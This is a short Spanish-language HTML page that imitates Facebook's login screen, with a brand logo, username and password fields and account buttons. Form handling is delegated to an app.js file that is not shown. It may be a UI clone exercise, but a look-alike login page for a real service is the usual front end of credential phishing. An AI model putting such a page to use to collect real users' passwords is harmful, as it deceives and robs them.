<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

    <div class="left">
        <h1 class="logo">facebook</h1>

        <p>
            Bienvenido a nuestra plataforma.
            Inicia sesión para continuar.
        </p>
    </div>

    <div class="right">

        <form id="loginForm">

            <input
                type="text"
                name="usuario"
                placeholder="Correo electrónico o usuario"
                required
            >

            <input
                type="password"
                name="password"
                placeholder="Contraseña"
                required
            >

            <button type="submit">
                Iniciar sesión
            </button>

            <a href="#">
                ¿Olvidaste tu contraseña?
            </a>

            <hr>

            <button type="button" class="crear">
                Crear cuenta nueva
            </button>

        </form>

        <p class="info">
            Crea una página para una empresa, marca o negocio.
        </p>

    </div>

</div>

<script src="app.js"></script>

</body>
</html>
